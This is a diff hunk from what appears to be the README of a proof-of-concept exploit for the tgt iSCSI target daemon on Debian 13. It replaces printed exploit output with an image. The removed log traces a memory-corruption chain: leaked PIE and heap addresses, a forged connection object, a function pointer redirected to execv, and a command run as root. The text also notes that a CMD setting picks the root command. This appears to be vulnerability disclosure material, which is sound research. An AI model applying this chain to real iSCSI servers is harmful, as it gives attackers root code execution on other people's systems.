@@ -20,16 +20,7 @@ sh poc-trixie/run.sh        # Debian 13, tgt 1:1.0.85-1.3
 
 Each script builds the image from the distribution archive, starts `tgtd` with one target and one LUN, runs the exploit from the host, and reads back the command output:
 
-```
-[1] anchor=0x2000 pie=000057e1b6ce7000 heap=000057e100000000
-[2] fake conn at 000057e1e6f57000 argv at 000057e1e6f57400
-[3] iscsi_tcp.free_data_buf <- execv@plt
-[4] victim task repointed at the fake connection
-[5] conn->tx_task = victim
-[6] closing socket
---- /win.txt (written by tgtd running as root in the target) ---
-uid=0(root) gid=0(root) groups=0(root)
-```
+![](img/run.png)
 
 `CMD` changes the command, which runs as `root` in the target container:
 
